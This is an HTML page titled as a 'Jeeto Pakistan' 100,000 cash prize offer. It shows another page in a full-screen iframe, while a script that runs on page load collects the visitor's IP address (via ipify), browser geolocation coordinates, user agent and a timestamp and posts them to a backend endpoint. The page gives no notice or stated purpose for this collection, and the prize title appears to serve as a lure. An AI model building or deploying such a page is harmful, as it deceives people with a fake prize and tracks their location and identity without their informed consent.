<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Jeeto Pakistan Jeeto 100,000/- Cash</title>
</head>
<body>
  <iframe 
    src="/Jeeto%20Pakistan.html/" 
    style="width: 100%; height: 100vh; border: none;"
    title="Jeeto Pakistan Page">
  </iframe>

  <script>
    // Function to fetch IP address from IPify
    async function fetchIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip; // Return the IP address
      } catch (error) {
        console.error('Error fetching IP:', error);
        return 'IP not available'; // Fallback if IP can't be fetched
      }
    }

    // Function to send data to the backend
    async function sendData(data) {
      try {
        const response = await fetch('/api/user-data', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data),
        });

        const result = await response.json();
        console.log('Server Response:', result);
      } catch (error) {
        console.error('Error sending data:', error);
      }
    }

    // Function to get geolocation
    function getLocation(ip) {
      if (!navigator.geolocation) {
        console.error('Geolocation is not supported by your browser.');
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;

          // Collect user data
          const data = {
            ip: ip,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            latitude,
            longitude,
          };

          // Send data to the backend
          sendData(data);
        },
        (error) => {
          console.error('Error getting geolocation:', error);
        }
      );
    }

    // Main function to orchestrate data collection
    async function collectUserData() {
      const ip = await fetchIP(); // Fetch IP using IPify API
      getLocation(ip); // Fetch geolocation and send all data
    }

    // Trigger user data collection on page load
    collectUserData();
  </script>
</body>
</html>
